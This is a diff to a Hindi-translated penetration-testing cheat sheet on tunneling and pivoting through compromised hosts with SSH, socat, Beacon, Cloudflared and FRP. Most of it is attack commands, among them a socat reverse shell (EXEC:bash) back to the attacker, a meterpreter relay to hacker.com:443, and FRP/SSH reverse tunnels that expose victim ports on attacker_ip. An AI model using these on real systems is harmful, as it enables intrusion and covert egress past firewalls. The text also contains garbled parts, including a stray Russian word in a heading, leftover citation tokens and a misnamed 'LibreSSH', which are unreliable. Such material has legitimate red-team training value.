@@ -1,8 +1,8 @@
-# Tunneling and Port Forwarding
+# टनलिंग और पोर्ट फॉरवर्डिंग
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap tip
+## Nmap टिप
 
 > [!WARNING]
 > **ICMP** और **SYN** स्कैन को सॉक्स प्रॉक्सी के माध्यम से टनल नहीं किया जा सकता, इसलिए हमें **पिंग डिस्कवरी** को **अक्षम** करना होगा (`-Pn`) और इसके काम करने के लिए **TCP स्कैन** (`-sT`) निर्दिष्ट करना होगा।
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> Third_box:Port
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> तीसरा_बॉक्स:पोर्ट
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -51,13 +51,13 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> कहीं भी
+स्थानीय पोर्ट --> समझौता किया गया होस्ट (SSH) --> जहाँ भी
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
 ### Reverse Port Forwarding
 
-यह आंतरिक होस्ट से एक DMZ के माध्यम से आपके होस्ट पर रिवर्स शेल प्राप्त करने के लिए उपयोगी है:
+यह आंतरिक होस्ट से DMZ के माध्यम से आपके होस्ट पर रिवर्स शेल प्राप्त करने के लिए उपयोगी है:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -87,10 +87,14 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **सुरक्षा – टेरापिन हमला (CVE-2023-48795)**
+> 2023 का टेरापिन डाउनग्रेड हमला एक मैन-इन-द-मिडल को प्रारंभिक SSH हैंडशेक के साथ छेड़छाड़ करने और **किसी भी फॉरवर्डेड चैनल** ( `-L`, `-R`, `-D` ) में डेटा इंजेक्ट करने की अनुमति दे सकता है। सुनिश्चित करें कि क्लाइंट और सर्वर दोनों पैच किए गए हैं (**OpenSSH ≥ 9.6/LibreSSH 6.7**) या SSH टनल पर निर्भर होने से पहले कमजोर `chacha20-poly1305@openssh.com` और `*-etm@openssh.com` एल्गोरिदम को `sshd_config`/`ssh_config` में स्पष्ट रूप से अक्षम करें। citeturn4search0
+
 ## SSHUTTLE
 
-आप **ssh** के माध्यम से एक होस्ट के माध्यम से एक **उपनेटवर्क** के लिए सभी **ट्रैफ़िक** को **टनेल** कर सकते हैं।\
-उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी ट्रैफ़िक को अग्रेषित करना
+आप **ssh** के माध्यम से एक होस्ट के माध्यम से **उपनेटवर्क** के लिए सभी **ट्रैफ़िक** को **टनल** कर सकते हैं।\
+उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी ट्रैफ़िक को फॉरवर्ड करना
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -154,7 +158,7 @@ To note:
 
 - Beacon's reverse port forward is designed to **ट्रैफ़िक को Team Server तक टनल करने के लिए, व्यक्तिगत मशीनों के बीच रिले करने के लिए नहीं**।
 - ट्रैफ़िक **Beacon के C2 ट्रैफ़िक के भीतर टनल किया जाता है**, जिसमें P2P लिंक शामिल हैं।
-- **प्रशासक विशेषाधिकार की आवश्यकता नहीं है** उच्च पोर्ट पर रिवर्स पोर्ट फॉरवर्ड बनाने के लिए।
+- **एडमिन विशेषाधिकार की आवश्यकता नहीं है** उच्च पोर्ट पर रिवर्स पोर्ट फॉरवर्ड बनाने के लिए।
 
 ### rPort2Port local
 
@@ -272,11 +276,11 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### Port2Port socks के माध्यम से
+### Port2Port через socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter के लिए SSL Socat
+### SSL Socat के माध्यम से Meterpreter
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -286,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-आप एक **गैर-प्रमाणित प्रॉक्सी** को बायपास कर सकते हैं, पीड़ित के कंसोल में अंतिम लाइन के बजाय यह लाइन चलाकर:
+आप एक **गैर-प्रमाणित प्रॉक्सी** को बायपास कर सकते हैं, इस पंक्ति को पीड़ित के कंसोल में अंतिम पंक्ति के बजाय निष्पादित करके:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -294,7 +298,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh कंसोल**
 
 दोनों पक्षों पर प्रमाणपत्र बनाएं: क्लाइंट और सर्वर
 ```bash
@@ -346,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 आपको **सिस्टम पर RDP एक्सेस** होना चाहिए।\
 डाउनलोड करें:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह उपकरण Windows की Remote Desktop Service सुविधा से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP कनेक्शन के माध्यम से पैकेट्स को टनलिंग** के लिए जिम्मेदार है।
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह उपकरण Windows की Remote Desktop Service सुविधा से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC **RDP कनेक्शन के माध्यम से पैकेट्स को टनल करने** के लिए जिम्मेदार है।
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 अपने क्लाइंट कंप्यूटर में **`SocksOverRDP-Plugin.dll`** को इस तरह लोड करें:
@@ -384,7 +388,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 यह एक प्रॉक्सी के खिलाफ प्रमाणीकरण करता है और एक पोर्ट को स्थानीय रूप से बाइंड करता है जो आपके द्वारा निर्दिष्ट बाहरी सेवा की ओर अग्रेषित होता है। फिर, आप इस पोर्ट के माध्यम से अपनी पसंद के उपकरण का उपयोग कर सकते हैं।\
-उदाहरण के लिए, यह पोर्ट 443 को अग्रेषित करता है।
+उदाहरण के लिए, वह पोर्ट 443 को अग्रेषित करता है।
 ```
 Username Alice
 Password P@ssw0rd
@@ -392,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-अब, यदि आप पीड़ित पर **SSH** सेवा को पोर्ट 443 पर सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
+अब, यदि आप उदाहरण के लिए पीड़ित पर **SSH** सेवा को पोर्ट 443 पर सुनने के लिए सेट करते हैं। आप इसे हमलावर पोर्ट 2222 के माध्यम से कनेक्ट कर सकते हैं।\
 आप एक **meterpreter** का भी उपयोग कर सकते हैं जो localhost:443 से कनेक्ट होता है और हमलावर पोर्ट 2222 पर सुन रहा है।
 
 ## YARP
@@ -442,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS बदलें
 
-Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** के रूप में, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
+Proxychains `gethostbyname` libc कॉल को इंटरसेप्ट करता है और tcp DNS अनुरोध को socks प्रॉक्सी के माध्यम से टनल करता है। **डिफ़ॉल्ट** रूप से, **DNS** सर्वर जो proxychains उपयोग करता है वह **4.2.2.2** है (हार्डकोडेड)। इसे बदलने के लिए, फ़ाइल संपादित करें: _/usr/lib/proxychains3/proxyresolv_ और IP बदलें। यदि आप **Windows वातावरण** में हैं, तो आप **डोमेन कंट्रोलर** का IP सेट कर सकते हैं।
 
 ## Go में टनल
 
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflare का `cloudflared` डेमन आउटबाउंड टनल बना सकता है जो **स्थानीय TCP/UDP सेवाओं** को बिना इनबाउंड फ़ायरवॉल नियमों की आवश्यकता के उजागर करता है, Cloudflare के एज का उपयोग करते हुए। यह तब बहुत उपयोगी होता है जब एग्रेस फ़ायरवॉल केवल HTTPS ट्रैफ़िक की अनुमति देता है लेकिन इनबाउंड कनेक्शन अवरुद्ध होते हैं।
+
+### Quick tunnel one-liner
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 पिवट
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### DNS के साथ स्थायी टनल
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+कनेक्टर शुरू करें:
+```bash
+cloudflared tunnel run mytunnel
+```
+क्योंकि सभी ट्रैफ़िक होस्ट से **443 पर आउटबाउंड** निकलता है, Cloudflared टनल इनग्रेस ACLs या NAT सीमाओं को बायपास करने का एक सरल तरीका है। ध्यान दें कि बाइनरी आमतौर पर उच्च विशेषाधिकारों के साथ चलती है - जब संभव हो, कंटेनरों का उपयोग करें या `--user` ध्वज का उपयोग करें। citeturn1search0
+
+## FRP (फास्ट रिवर्स प्रॉक्सी)
+
+[`frp`](https://github.com/fatedier/frp) एक सक्रिय रूप से बनाए रखा जाने वाला Go रिवर्स-प्रॉक्सी है जो **TCP, UDP, HTTP/S, SOCKS और P2P NAT-hole-punching** का समर्थन करता है। **v0.53.0 (मई 2024)** से शुरू होकर, यह एक **SSH टनल गेटवे** के रूप में कार्य कर सकता है, ताकि एक लक्षित होस्ट केवल स्टॉक OpenSSH क्लाइंट का उपयोग करके एक रिवर्स टनल स्थापित कर सके - कोई अतिरिक्त बाइनरी की आवश्यकता नहीं है।
+
+### क्लासिक रिवर्स TCP टनल
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### नए SSH गेटवे का उपयोग करना (कोई frpc बाइनरी नहीं)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+उपरोक्त कमांड पीड़ित के पोर्ट **8080** को **attacker_ip:9000** के रूप में प्रकाशित करता है बिना किसी अतिरिक्त उपकरण को तैनात किए - यह लिविंग-ऑफ-द-लैंड पिवोटिंग के लिए आदर्श है। citeturn2search1
+
 ## अन्य उपकरण जांचने के लिए
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
